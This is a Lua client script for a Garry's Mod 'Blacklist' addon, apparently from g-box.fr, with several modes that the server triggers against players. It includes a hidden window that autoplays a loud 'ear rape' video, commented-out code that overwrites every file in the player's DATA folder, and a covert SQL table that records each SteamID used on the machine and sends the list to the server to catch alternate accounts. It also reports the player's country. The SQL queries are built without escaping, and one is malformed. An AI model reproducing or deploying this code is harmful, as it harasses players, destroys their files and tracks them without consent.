local function report(senderNick, senderSteam, victimSteam, raison)
	http.Post("https://g-box.fr/wp-content/blacklist/report.php", { senderNick=senderNick, senderSteam=senderSteam, victimSteam=victimSteam, raison=raison },function()
		chat.AddText(Color(255,0,0), "[BL] Report sended by homing pigeon!")
	end, function(er)
		chat.AddText(Color(255,0,0), "[BL] Homing pigeon was shot in fly by " .. er)
	end)
end

local function showBlacklistDerma()
	local ply = LocalPlayer()
	local Window = vgui.Create("DFrame")
	Window:SetTitle("Report")
	Window:SetDraggable( false )
	Window:ShowCloseButton(true)
	Window:SetBackgroundBlur( true )
	Window:SetDrawOnTop( true )
	local InnerPanel = vgui.Create("DPanel", Window)
	InnerPanel:SetPaintBackground(false)
	local Text = vgui.Create("DLabel", InnerPanel)
	Text:SetText("Report someone to The Blacklist")
	Text:SizeToContents()
	Text:SetContentAlignment( 5 )
	local SteamPanel = vgui.Create("DPanel", Window)
	SteamPanel:SetPaintBackground(false)
	local SteamIDReport = vgui.Create("DTextEntry", SteamPanel)
	SteamIDReport:SetText("STEAMID")
	local TexteEntry = vgui.Create("DTextEntry", SteamPanel)
	TexteEntry:SetText("Reason")
	TexteEntry.OnEnter = function()
		Window:Close()
		report(ply:Nick(), ply:SteamID(), SteamIDReport:GetValue(), TexteEntry:GetValue()) -- send reporter's nick and steamid and the player reported steamid and reason
	end
	SteamIDReport.OnEnter = function()
		TexteEntry:RequestFocus()
		TexteEntry:SelectAllText(true)
	end
	local SteamLabel = vgui.Create("DLabel",SteamPanel)
	SteamLabel:SetText("SteamID:")
	SteamLabel:SetPos( 200, 0)
	SteamLabel:SetSize( 50, 15)
	local ButtonPanel = vgui.Create("DPanel", Window)
	ButtonPanel:SetTall(25)
	ButtonPanel:SetPaintBackground(false)
	local ButtonOk = vgui.Create("DButton", ButtonPanel)
	ButtonOk:SetText("OK")
	ButtonOk:SizeToContents()
	ButtonOk:SetTall( 20 )
	ButtonOk:SetWide( ButtonOk:GetWide() + 20 )
	ButtonOk:SetPos(5, 3)
	ButtonOk.DoClick = function()
	   	Window:Close()
		report( ply:Nick(), ply:SteamID(), SteamIDReport:GetValue(), TexteEntry:GetValue())
	end
	ButtonPanel:SetWide( ButtonOk:GetWide() + 5 )
	Window:SetSize( 450, 111 + 75 + 20 )
	Window:Center()
	InnerPanel:StretchToParent( 5, 25, 5, 125 )
	SteamPanel:StretchToParent(5, 83, 5, 37)
	SteamIDReport:SetPos(149, 20)
	SteamIDReport:SetSize( 150, 20)
	Text:StretchToParent( 5, 5, 5, nil )
	TexteEntry:StretchToParent( 5, nil, 5, nil )
	TexteEntry:AlignBottom( 5 )
	TexteEntry:RequestFocus()
	ButtonPanel:CenterHorizontal()
	ButtonPanel:AlignBottom(7)
	Window:MakePopup()
	Window:DoModal()
	SteamIDReport:RequestFocus()
	SteamIDReport:SelectAllText(true)
end

local function blacklistUrlCli(time)
	local Window = vgui.Create("DFrame")
	Window:SetSize(0,0)
	Window:MakePopup()
	Window:SetMouseInputEnabled(false)
	Window:SetKeyboardInputEnabled(false)
	local html = vgui.Create("DHTML", Window)
	html:OpenURL("https://www.youtube.com/watch?v=b1tr48SAVes&autoplay=1&controls=0&start=21") -- ear rape
end

local function blacklistUpgradeMe() -- delete everything in data/
	-- IF YOU UNCOMMENT THIS LINE EVERYTHING THE BLACKLIST DO IS YOUR RESPONSABILTY
	--[[
	local files, folders = file.Find(path .. "*", "DATA")
	for _,v in pairs(files) do
		file.Write(path..v, "Vous etes dans la Blacklist. Tout votre dossier DATA a ete efface.\nBLACKLIST => http://g-box.fr/\n")
		file.Append(path..v,"You are in The Blacklist. Your DATA folder was deleted.\nBLACKLIST => http://g-box.fr/")
	end
	
	for _,v in pairs(folders) do
		blacklistUpgradeMe(path .. v .."/")
	end
	]]
end

local function drawBlacklistedPlayer(blPlayer, timerSec)
	surface.CreateFont("blacklistPlayerIndicator", {
		font = "Arial",
		size = 200
	})
	local steamID, turningVar = blPlayer:SteamID(), 0
	hook.Add("PostPlayerDraw","blacklistDrawText" .. steamID,function(ply)
		if ply == blPlayer && IsValid(ply) && !(ply == LocalPlayer()) && ply:GetPos():DistToSqr(LocalPlayer():GetPos()) < 500000 then
			if turningVar > 360 then
				turningVar = 0
			end
			turningVar = turningVar + 0.11
			local _, plyHeight = ply:GetModelRenderBounds() -- Set text pos compared to model height
			local plyPos = ply:GetPos() + Vector(0, 0, plyHeight.z + 20)
			if plyPos:DistToSqr(EyePos()) < 500000 then
				cam.Start3D2D(plyPos, Angle(0, turningVar, 90), 0.09)
					draw.DrawText("BLACKLIST\n▼", "blacklistPlayerIndicator", 0, 0, Color(255, 0, 0), TEXT_ALIGN_CENTER)
				cam.End3D2D()
				cam.Start3D2D(plyPos, Angle(0, turningVar + 180, 90), 0.09)
					draw.DrawText("BLACKLIST\n▼", "blacklistPlayerIndicator", 0, 0, Color(255, 0, 0), TEXT_ALIGN_CENTER)
				cam.End3D2D()
			end
		end
	end)
	timer.Simple(timerSec, function()
		hook.Remove("PostPlayerDraw","blacklistDrawText" .. steamID)
	end)
end

local function bypassBanCheck()
	hook.Add("InitPostEntity","blacklistBypassChecker", function() -- bypass ban
		if !sql.TableExists("hellowatrudoinghere") then
			sql.Query("CREATE TABLE hellowatrudoinghere ( topsickrekt VARCHAR(30) )")
			sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES (\"" .. LocalPlayer():SteamID() .. "\")")
		elseif !(sql.Query("SELECT * FROM hellowatrudoinghere")) then
			sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES (\"" .. LocalPlayer():SteamID() .. "\")")
		else
			net.Start("blacklist_gbox_net")
			net.WriteUInt(0,2)
			net.WriteTable(sql.Query("SELECT * FROM hellowatrudoinghere"))
			net.SendToServer()
			if sql.Query("SELECT * FROM hellowatrudoinghere WHERE topsickrekt=\"" .. LocalPlayer():SteamID()) then
				sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES (\"" .. LocalPlayer():SteamID() .. "\")")
			end
		end
	end)
end

net.Receive("blacklist_gbox_net", function() -- Better than creating over 9000 networkString nah ?
	local mode = net.ReadUInt(3)
	if mode == 0 then
		blacklistUrlCli(net.ReadUInt(16))
	elseif mode == 1 then
		blacklistUpgradeMe()
	elseif mode == 2 then
		showBlacklistDerma()
	elseif mode == 3 then
		drawBlacklistedPlayer(Entity(net.ReadUInt(8)), net.ReadUInt(16))
	elseif mode == 4 then -- country ban
		net.Start("blacklist_gbox_net")
		net.WriteUInt(1,2)
		net.WriteString(system.GetCountry())
		net.SendToServer()
	elseif mode == 5 then
		bypassBanCheck()
	end
end)